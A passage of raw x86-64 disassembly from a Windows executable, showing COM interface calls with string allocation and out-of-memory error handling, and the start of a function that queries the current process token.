   1400016c7:	48 8b 11             	mov    (%rcx),%rdx
   1400016ca:	ff 52 10             	call   *0x10(%rdx)
   1400016cd:	ff 15 b5 3c 00 00    	call   *0x3cb5(%rip)        # 0x140005388
   1400016d3:	8b c3                	mov    %ebx,%eax
   1400016d5:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   1400016dc:	48 33 cc             	xor    %rsp,%rcx
   1400016df:	e8 1c 16 00 00       	call   0x140002d00
   1400016e4:	4c 8d 9c 24 d0 01 00 	lea    0x1d0(%rsp),%r11
   1400016eb:	00 
   1400016ec:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400016f0:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400016f4:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   1400016f8:	4d 8b 73 28          	mov    0x28(%r11),%r14
   1400016fc:	49 8b e3             	mov    %r11,%rsp
   1400016ff:	5d                   	pop    %rbp
   140001700:	c3                   	ret
   140001701:	4c 89 b5 88 00 00 00 	mov    %r14,0x88(%rbp)
   140001708:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   14000170c:	48 8b 01             	mov    (%rcx),%rax
   14000170f:	48 8d 95 88 00 00 00 	lea    0x88(%rbp),%rdx
   140001716:	ff 50 38             	call   *0x38(%rax)
   140001719:	85 c0                	test   %eax,%eax
   14000171b:	0f 88 5b 01 00 00    	js     0x14000187c
   140001721:	b9 18 00 00 00       	mov    $0x18,%ecx
   140001726:	e8 fd 15 00 00       	call   0x140002d28
   14000172b:	48 8b d8             	mov    %rax,%rbx
   14000172e:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001733:	48 85 c0             	test   %rax,%rax
   140001736:	74 32                	je     0x14000176a
   140001738:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000173b:	33 c0                	xor    %eax,%eax
   14000173d:	0f 11 03             	movups %xmm0,(%rbx)
   140001740:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001744:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140001748:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   14000174f:	48 8d 0d 2a 3e 00 00 	lea    0x3e2a(%rip),%rcx        # 0x140005580
   140001756:	ff 15 fc 39 00 00    	call   *0x39fc(%rip)        # 0x140005158
   14000175c:	48 89 03             	mov    %rax,(%rbx)
   14000175f:	48 85 c0             	test   %rax,%rax
   140001762:	0f 84 c3 05 00 00    	je     0x140001d2b
   140001768:	eb 03                	jmp    0x14000176d
   14000176a:	49 8b de             	mov    %r14,%rbx
   14000176d:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001772:	48 85 db             	test   %rbx,%rbx
   140001775:	0f 84 dc 05 00 00    	je     0x140001d57
   14000177b:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   140001782:	48 8b 01             	mov    (%rcx),%rax
   140001785:	48 8b 13             	mov    (%rbx),%rdx
   140001788:	ff 50 50             	call   *0x50(%rax)
   14000178b:	90                   	nop
   14000178c:	8b c7                	mov    %edi,%eax
   14000178e:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   140001793:	83 f8 01             	cmp    $0x1,%eax
   140001796:	75 30                	jne    0x1400017c8
   140001798:	48 8b 0b             	mov    (%rbx),%rcx
   14000179b:	48 85 c9             	test   %rcx,%rcx
   14000179e:	74 09                	je     0x1400017a9
   1400017a0:	ff 15 c2 39 00 00    	call   *0x39c2(%rip)        # 0x140005168
   1400017a6:	4c 89 33             	mov    %r14,(%rbx)
   1400017a9:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400017ad:	48 85 c9             	test   %rcx,%rcx
   1400017b0:	74 09                	je     0x1400017bb
   1400017b2:	e8 69 15 00 00       	call   0x140002d20
   1400017b7:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400017bb:	ba 18 00 00 00       	mov    $0x18,%edx
   1400017c0:	48 8b cb             	mov    %rbx,%rcx
   1400017c3:	e8 58 15 00 00       	call   0x140002d20
   1400017c8:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400017cd:	e8 56 15 00 00       	call   0x140002d28
   1400017d2:	48 8b d8             	mov    %rax,%rbx
   1400017d5:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400017da:	48 85 c0             	test   %rax,%rax
   1400017dd:	74 32                	je     0x140001811
   1400017df:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400017e2:	33 c0                	xor    %eax,%eax
   1400017e4:	0f 11 03             	movups %xmm0,(%rbx)
   1400017e7:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400017eb:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400017ef:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400017f6:	48 8d 0d b3 3d 00 00 	lea    0x3db3(%rip),%rcx        # 0x1400055b0
   1400017fd:	ff 15 55 39 00 00    	call   *0x3955(%rip)        # 0x140005158
   140001803:	48 89 03             	mov    %rax,(%rbx)
   140001806:	48 85 c0             	test   %rax,%rax
   140001809:	0f 84 27 05 00 00    	je     0x140001d36
   14000180f:	eb 03                	jmp    0x140001814
   140001811:	49 8b de             	mov    %r14,%rbx
   140001814:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001819:	48 85 db             	test   %rbx,%rbx
   14000181c:	0f 84 35 05 00 00    	je     0x140001d57
   140001822:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   140001829:	48 8b 01             	mov    (%rcx),%rax
   14000182c:	48 8b 13             	mov    (%rbx),%rdx
   14000182f:	ff 50 40             	call   *0x40(%rax)
   140001832:	90                   	nop
   140001833:	8b c7                	mov    %edi,%eax
   140001835:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000183a:	83 f8 01             	cmp    $0x1,%eax
   14000183d:	75 30                	jne    0x14000186f
   14000183f:	48 8b 0b             	mov    (%rbx),%rcx
   140001842:	48 85 c9             	test   %rcx,%rcx
   140001845:	74 09                	je     0x140001850
   140001847:	ff 15 1b 39 00 00    	call   *0x391b(%rip)        # 0x140005168
   14000184d:	4c 89 33             	mov    %r14,(%rbx)
   140001850:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001854:	48 85 c9             	test   %rcx,%rcx
   140001857:	74 09                	je     0x140001862
   140001859:	e8 c2 14 00 00       	call   0x140002d20
   14000185e:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140001862:	ba 18 00 00 00       	mov    $0x18,%edx
   140001867:	48 8b cb             	mov    %rbx,%rcx
   14000186a:	e8 b1 14 00 00       	call   0x140002d20
   14000186f:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   140001876:	48 8b 01             	mov    (%rcx),%rax
   140001879:	ff 50 10             	call   *0x10(%rax)
   14000187c:	4c 89 b5 a0 00 00 00 	mov    %r14,0xa0(%rbp)
   140001883:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140001887:	48 8b 01             	mov    (%rcx),%rax
   14000188a:	48 8d 95 a0 00 00 00 	lea    0xa0(%rbp),%rdx
   140001891:	ff 50 48             	call   *0x48(%rax)
   140001894:	8b d8                	mov    %eax,%ebx
   140001896:	85 c0                	test   %eax,%eax
   140001898:	79 23                	jns    0x1400018bd
   14000189a:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   14000189e:	48 8b 11             	mov    (%rcx),%rdx
   1400018a1:	ff 52 10             	call   *0x10(%rdx)
   1400018a4:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400018a8:	48 8b 11             	mov    (%rcx),%rdx
   1400018ab:	ff 52 10             	call   *0x10(%rdx)
   1400018ae:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400018b2:	48 8b 01             	mov    (%rcx),%rax
   1400018b5:	ff 50 10             	call   *0x10(%rax)
   1400018b8:	e9 10 fe ff ff       	jmp    0x1400016cd
   1400018bd:	4c 89 b5 b0 00 00 00 	mov    %r14,0xb0(%rbp)
   1400018c4:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   1400018cb:	48 8b 01             	mov    (%rcx),%rax
   1400018ce:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   1400018d5:	ba 09 00 00 00       	mov    $0x9,%edx
   1400018da:	ff 50 50             	call   *0x50(%rax)
   1400018dd:	8b d8                	mov    %eax,%ebx
   1400018df:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   1400018e6:	48 8b 11             	mov    (%rcx),%rdx
   1400018e9:	ff 52 10             	call   *0x10(%rdx)
   1400018ec:	85 db                	test   %ebx,%ebx
   1400018ee:	78 52                	js     0x140001942
   1400018f0:	48 8b 8d b0 00 00 00 	mov    0xb0(%rbp),%rcx
   1400018f7:	48 8b 01             	mov    (%rcx),%rax
   1400018fa:	ff 50 10             	call   *0x10(%rax)
   1400018fd:	4c 89 75 78          	mov    %r14,0x78(%rbp)
   140001901:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140001905:	48 8b 01             	mov    (%rcx),%rax
   140001908:	48 8d 55 78          	lea    0x78(%rbp),%rdx
   14000190c:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140001912:	8b d8                	mov    %eax,%ebx
   140001914:	85 c0                	test   %eax,%eax
   140001916:	78 82                	js     0x14000189a
   140001918:	4c 89 b5 80 00 00 00 	mov    %r14,0x80(%rbp)
   14000191f:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140001923:	48 8b 01             	mov    (%rcx),%rax
   140001926:	4c 8d 85 80 00 00 00 	lea    0x80(%rbp),%r8
   14000192d:	33 d2                	xor    %edx,%edx
   14000192f:	ff 50 60             	call   *0x60(%rax)
   140001932:	8b d8                	mov    %eax,%ebx
   140001934:	85 c0                	test   %eax,%eax
   140001936:	79 2d                	jns    0x140001965
   140001938:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   14000193c:	48 8b 11             	mov    (%rcx),%rdx
   14000193f:	ff 52 10             	call   *0x10(%rdx)
   140001942:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140001946:	48 8b 11             	mov    (%rcx),%rdx
   140001949:	ff 52 10             	call   *0x10(%rdx)
   14000194c:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140001950:	48 8b 01             	mov    (%rcx),%rax
   140001953:	ff 50 10             	call   *0x10(%rax)
   140001956:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   14000195a:	48 8b 01             	mov    (%rcx),%rax
   14000195d:	ff 50 10             	call   *0x10(%rax)
   140001960:	e9 68 fd ff ff       	jmp    0x1400016cd
   140001965:	4c 89 b5 90 00 00 00 	mov    %r14,0x90(%rbp)
   14000196c:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   140001973:	48 8b 01             	mov    (%rcx),%rax
   140001976:	4c 8d 85 90 00 00 00 	lea    0x90(%rbp),%r8
   14000197d:	48 8d 15 f4 3a 00 00 	lea    0x3af4(%rip),%rdx        # 0x140005478
   140001984:	ff 10                	call   *(%rax)
   140001986:	8b d8                	mov    %eax,%ebx
   140001988:	85 c0                	test   %eax,%eax
   14000198a:	79 3a                	jns    0x1400019c6
   14000198c:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   140001993:	48 8b 11             	mov    (%rcx),%rdx
   140001996:	ff 52 10             	call   *0x10(%rdx)
   140001999:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   14000199d:	48 8b 11             	mov    (%rcx),%rdx
   1400019a0:	ff 52 10             	call   *0x10(%rdx)
   1400019a3:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400019a7:	48 8b 01             	mov    (%rcx),%rax
   1400019aa:	ff 50 10             	call   *0x10(%rax)
   1400019ad:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400019b1:	48 8b 01             	mov    (%rcx),%rax
   1400019b4:	ff 50 10             	call   *0x10(%rax)
   1400019b7:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400019bb:	48 8b 01             	mov    (%rcx),%rax
   1400019be:	ff 50 10             	call   *0x10(%rax)
   1400019c1:	e9 07 fd ff ff       	jmp    0x1400016cd
   1400019c6:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400019cb:	e8 58 13 00 00       	call   0x140002d28
   1400019d0:	48 8b d8             	mov    %rax,%rbx
   1400019d3:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400019d8:	48 85 c0             	test   %rax,%rax
   1400019db:	74 32                	je     0x140001a0f
   1400019dd:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400019e0:	33 c0                	xor    %eax,%eax
   1400019e2:	0f 11 03             	movups %xmm0,(%rbx)
   1400019e5:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400019e9:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400019ed:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400019f4:	48 8d 0d e5 3b 00 00 	lea    0x3be5(%rip),%rcx        # 0x1400055e0
   1400019fb:	ff 15 57 37 00 00    	call   *0x3757(%rip)        # 0x140005158
   140001a01:	48 89 03             	mov    %rax,(%rbx)
   140001a04:	48 85 c0             	test   %rax,%rax
   140001a07:	0f 84 34 03 00 00    	je     0x140001d41
   140001a0d:	eb 03                	jmp    0x140001a12
   140001a0f:	49 8b de             	mov    %r14,%rbx
   140001a12:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001a17:	48 85 db             	test   %rbx,%rbx
   140001a1a:	0f 84 37 03 00 00    	je     0x140001d57
   140001a20:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140001a27:	48 8b 01             	mov    (%rcx),%rax
   140001a2a:	48 8b 13             	mov    (%rbx),%rdx
   140001a2d:	ff 50 58             	call   *0x58(%rax)
   140001a30:	8b f0                	mov    %eax,%esi
   140001a32:	8b cf                	mov    %edi,%ecx
   140001a34:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   140001a39:	83 f9 01             	cmp    $0x1,%ecx
   140001a3c:	75 30                	jne    0x140001a6e
   140001a3e:	48 8b 0b             	mov    (%rbx),%rcx
   140001a41:	48 85 c9             	test   %rcx,%rcx
   140001a44:	74 09                	je     0x140001a4f
   140001a46:	ff 15 1c 37 00 00    	call   *0x371c(%rip)        # 0x140005168
   140001a4c:	4c 89 33             	mov    %r14,(%rbx)
   140001a4f:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001a53:	48 85 c9             	test   %rcx,%rcx
   140001a56:	74 09                	je     0x140001a61
   140001a58:	e8 c3 12 00 00       	call   0x140002d20
   140001a5d:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140001a61:	ba 18 00 00 00       	mov    $0x18,%edx
   140001a66:	48 8b cb             	mov    %rbx,%rcx
   140001a69:	e8 b2 12 00 00       	call   0x140002d20
   140001a6e:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140001a75:	48 8b 01             	mov    (%rcx),%rax
   140001a78:	ff 50 10             	call   *0x10(%rax)
   140001a7b:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   140001a82:	48 8b 01             	mov    (%rcx),%rax
   140001a85:	ff 50 10             	call   *0x10(%rax)
   140001a88:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140001a8c:	48 8b 01             	mov    (%rcx),%rax
   140001a8f:	ff 50 10             	call   *0x10(%rax)
   140001a92:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140001a96:	85 f6                	test   %esi,%esi
   140001a98:	0f 88 45 02 00 00    	js     0x140001ce3
   140001a9e:	4c 89 b5 98 00 00 00 	mov    %r14,0x98(%rbp)
   140001aa5:	48 8b 01             	mov    (%rcx),%rax
   140001aa8:	48 8d 95 98 00 00 00 	lea    0x98(%rbp),%rdx
   140001aaf:	ff 50 58             	call   *0x58(%rax)
   140001ab2:	4c 89 b5 a8 00 00 00 	mov    %r14,0xa8(%rbp)
   140001ab9:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140001abd:	48 8b 01             	mov    (%rcx),%rax
   140001ac0:	48 8d 95 a8 00 00 00 	lea    0xa8(%rbp),%rdx
   140001ac7:	ff 50 78             	call   *0x78(%rax)
   140001aca:	85 c0                	test   %eax,%eax
   140001acc:	78 5e                	js     0x140001b2c
   140001ace:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140001ad5:	48 85 c9             	test   %rcx,%rcx
   140001ad8:	74 21                	je     0x140001afb
   140001ada:	48 8b 01             	mov    (%rcx),%rax
   140001add:	ba 01 00 00 00       	mov    $0x1,%edx
   140001ae2:	ff 90 90 00 00 00    	call   *0x90(%rax)
   140001ae8:	8b d8                	mov    %eax,%ebx
   140001aea:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140001af1:	48 8b 11             	mov    (%rcx),%rdx
   140001af4:	ff 52 10             	call   *0x10(%rdx)
   140001af7:	85 db                	test   %ebx,%ebx
   140001af9:	78 31                	js     0x140001b2c
   140001afb:	8b d7                	mov    %edi,%edx
   140001afd:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140001b04:	48 8b 01             	mov    (%rcx),%rax
   140001b07:	ff 90 b0 00 00 00    	call   *0xb0(%rax)
   140001b0d:	33 d2                	xor    %edx,%edx
   140001b0f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140001b16:	48 8b 01             	mov    (%rcx),%rax
   140001b19:	ff 90 30 01 00 00    	call   *0x130(%rax)
   140001b1f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140001b26:	48 8b 01             	mov    (%rcx),%rax
   140001b29:	ff 50 10             	call   *0x10(%rax)
   140001b2c:	4c 89 b5 b8 00 00 00 	mov    %r14,0xb8(%rbp)
   140001b33:	b8 08 00 00 00       	mov    $0x8,%eax
   140001b38:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   140001b3d:	48 8d 0d e4 3a 00 00 	lea    0x3ae4(%rip),%rcx        # 0x140005628
   140001b44:	ff 15 0e 36 00 00    	call   *0x360e(%rip)        # 0x140005158
   140001b4a:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140001b4f:	48 85 c0             	test   %rax,%rax
   140001b52:	0f 84 0a 02 00 00    	je     0x140001d62
   140001b58:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   140001b5d:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140001b61:	f2 0f 10 45 80       	movsd  -0x80(%rbp),%xmm0
   140001b66:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   140001b6c:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140001b70:	ff 15 ea 35 00 00    	call   *0x35ea(%rip)        # 0x140005160
   140001b76:	90                   	nop
   140001b77:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   140001b7b:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   140001b7f:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   140001b84:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140001b8a:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140001b8e:	ff 15 cc 35 00 00    	call   *0x35cc(%rip)        # 0x140005160
   140001b94:	90                   	nop
   140001b95:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   140001b99:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140001b9d:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   140001ba3:	f2 0f 11 45 50       	movsd  %xmm0,0x50(%rbp)
   140001ba8:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   140001bac:	0f 29 45 20          	movaps %xmm0,0x20(%rbp)
   140001bb0:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140001bb6:	f2 0f 11 45 30       	movsd  %xmm0,0x30(%rbp)
   140001bbb:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   140001bbf:	0f 29 45 00          	movaps %xmm0,0x0(%rbp)
   140001bc3:	f2 0f 10 4d b8       	movsd  -0x48(%rbp),%xmm1
   140001bc8:	f2 0f 11 4d 10       	movsd  %xmm1,0x10(%rbp)
   140001bcd:	b9 18 00 00 00       	mov    $0x18,%ecx
   140001bd2:	e8 51 11 00 00       	call   0x140002d28
   140001bd7:	48 8b d8             	mov    %rax,%rbx
   140001bda:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001bdf:	48 85 c0             	test   %rax,%rax
   140001be2:	74 32                	je     0x140001c16
   140001be4:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001be7:	33 c0                	xor    %eax,%eax
   140001be9:	0f 11 03             	movups %xmm0,(%rbx)
   140001bec:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001bf0:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140001bf4:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140001bfb:	48 8d 0d 66 39 00 00 	lea    0x3966(%rip),%rcx        # 0x140005568
   140001c02:	ff 15 50 35 00 00    	call   *0x3550(%rip)        # 0x140005158
   140001c08:	48 89 03             	mov    %rax,(%rbx)
   140001c0b:	48 85 c0             	test   %rax,%rax
   140001c0e:	0f 84 38 01 00 00    	je     0x140001d4c
   140001c14:	eb 03                	jmp    0x140001c19
   140001c16:	49 8b de             	mov    %r14,%rbx
   140001c19:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001c1e:	48 85 db             	test   %rbx,%rbx
   140001c21:	0f 84 e3 00 00 00    	je     0x140001d0a
   140001c27:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140001c2b:	48 8b 01             	mov    (%rcx),%rax
   140001c2e:	48 8d 95 b8 00 00 00 	lea    0xb8(%rbp),%rdx
   140001c35:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140001c3a:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   140001c3e:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140001c43:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   140001c4a:	00 
   140001c4b:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140001c4f:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001c54:	48 8d 55 00          	lea    0x0(%rbp),%rdx
   140001c58:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140001c5d:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140001c63:	4c 8b 45 60          	mov    0x60(%rbp),%r8
   140001c67:	48 8b 13             	mov    (%rbx),%rdx
   140001c6a:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140001c70:	8b f0                	mov    %eax,%esi
   140001c72:	f0 0f c1 7b 10       	lock xadd %edi,0x10(%rbx)
   140001c77:	83 ff 01             	cmp    $0x1,%edi
   140001c7a:	75 31                	jne    0x140001cad
   140001c7c:	48 8b 0b             	mov    (%rbx),%rcx
   140001c7f:	48 85 c9             	test   %rcx,%rcx
   140001c82:	74 09                	je     0x140001c8d
   140001c84:	ff 15 de 34 00 00    	call   *0x34de(%rip)        # 0x140005168
   140001c8a:	4c 89 33             	mov    %r14,(%rbx)
   140001c8d:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001c91:	48 85 c9             	test   %rcx,%rcx
   140001c94:	74 09                	je     0x140001c9f
   140001c96:	e8 85 10 00 00       	call   0x140002d20
   140001c9b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140001c9f:	ba 18 00 00 00       	mov    $0x18,%edx
   140001ca4:	48 8b cb             	mov    %rbx,%rcx
   140001ca7:	e8 74 10 00 00       	call   0x140002d20
   140001cac:	90                   	nop
   140001cad:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140001cb1:	ff 15 99 34 00 00    	call   *0x3499(%rip)        # 0x140005150
   140001cb7:	90                   	nop
   140001cb8:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140001cbc:	ff 15 8e 34 00 00    	call   *0x348e(%rip)        # 0x140005150
   140001cc2:	90                   	nop
   140001cc3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001cc8:	ff 15 82 34 00 00    	call   *0x3482(%rip)        # 0x140005150
   140001cce:	85 f6                	test   %esi,%esi
   140001cd0:	78 0d                	js     0x140001cdf
   140001cd2:	48 8b 8d b8 00 00 00 	mov    0xb8(%rbp),%rcx
   140001cd9:	48 8b 01             	mov    (%rcx),%rax
   140001cdc:	ff 50 10             	call   *0x10(%rax)
   140001cdf:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140001ce3:	48 8b 01             	mov    (%rcx),%rax
   140001ce6:	ff 50 10             	call   *0x10(%rax)
   140001ce9:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140001ced:	48 8b 01             	mov    (%rcx),%rax
   140001cf0:	ff 50 10             	call   *0x10(%rax)
   140001cf3:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140001cf7:	48 8b 01             	mov    (%rcx),%rax
   140001cfa:	ff 50 10             	call   *0x10(%rax)
   140001cfd:	ff 15 85 36 00 00    	call   *0x3685(%rip)        # 0x140005388
   140001d03:	8b c6                	mov    %esi,%eax
   140001d05:	e9 cb f9 ff ff       	jmp    0x1400016d5
   140001d0a:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001d0f:	e8 4c 0e 00 00       	call   0x140002b60
   140001d14:	90                   	nop
   140001d15:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001d1a:	e8 41 0e 00 00       	call   0x140002b60
   140001d1f:	90                   	nop
   140001d20:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001d25:	e8 36 0e 00 00       	call   0x140002b60
   140001d2a:	90                   	nop
   140001d2b:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001d30:	e8 2b 0e 00 00       	call   0x140002b60
   140001d35:	90                   	nop
   140001d36:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001d3b:	e8 20 0e 00 00       	call   0x140002b60
   140001d40:	90                   	nop
   140001d41:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001d46:	e8 15 0e 00 00       	call   0x140002b60
   140001d4b:	90                   	nop
   140001d4c:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001d51:	e8 0a 0e 00 00       	call   0x140002b60
   140001d56:	90                   	nop
   140001d57:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001d5c:	e8 ff 0d 00 00       	call   0x140002b60
   140001d61:	cc                   	int3
   140001d62:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140001d67:	e8 f4 0d 00 00       	call   0x140002b60
   140001d6c:	cc                   	int3
   140001d6d:	cc                   	int3
   140001d6e:	cc                   	int3
   140001d6f:	cc                   	int3
   140001d70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d75:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001d7a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140001d7f:	55                   	push   %rbp
   140001d80:	48 8d ac 24 40 fe ff 	lea    -0x1c0(%rsp),%rbp
   140001d87:	ff 
   140001d88:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   140001d8f:	48 8b 05 aa 62 00 00 	mov    0x62aa(%rip),%rax        # 0x140008040
   140001d96:	48 33 c4             	xor    %rsp,%rax
   140001d99:	48 89 85 b0 01 00 00 	mov    %rax,0x1b0(%rbp)
   140001da0:	48 8d 15 31 39 00 00 	lea    0x3931(%rip),%rdx        # 0x1400056d8
   140001da7:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140001dae:	e8 1d 08 00 00       	call   0x1400025d0
   140001db3:	90                   	nop
   140001db4:	33 f6                	xor    %esi,%esi
   140001db6:	48 89 75 20          	mov    %rsi,0x20(%rbp)
   140001dba:	ff 15 60 33 00 00    	call   *0x3360(%rip)        # 0x140005120
   140001dc0:	48 8b c8             	mov    %rax,%rcx
   140001dc3:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   140001dc7:	ba 08 00 00 00       	mov    $0x8,%edx
   140001dcc:	ff 15 2e 32 00 00    	call   *0x322e(%rip)        # 0x140005000
   140001dd2:	85 c0                	test   %eax,%eax
   140001dd4:	0f 84 00 03 00 00    	je     0x1400020da
   140001dda:	c7 85 88 00 00 00 00 	movl   $0x100,0x88(%rbp)
   140001de1:	01 00 00 
   140001de4:	48 8d 85 88 00 00 00 	lea    0x88(%rbp),%rax
   140001deb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001df0:	41 b9 00 01 00 00    	mov    $0x100,%r9d
   140001df6:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   140001dfd:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e02:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140001e06:	ff 15 fc 31 00 00    	call   *0x31fc(%rip)        # 0x140005008
   140001e0c:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140001e10:	85 c0                	test   %eax,%eax
   140001e12:	75 0b                	jne    0x140001e1f
   140001e14:	ff 15 86 32 00 00    	call   *0x3286(%rip)        # 0x1400050a0
   140001e1a:	e9 bb 02 00 00       	jmp    0x1400020da
   140001e1f:	ff 15 7b 32 00 00    	call   *0x327b(%rip)        # 0x1400050a0
   140001e25:	48 8b 9d b0 00 00 00 	mov    0xb0(%rbp),%rbx
   140001e2c:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001e2f:	f3 0f 7f 45 4c       	movdqu %xmm0,0x4c(%rbp)
   140001e34:	48 89 75 60          	mov    %rsi,0x60(%rbp)
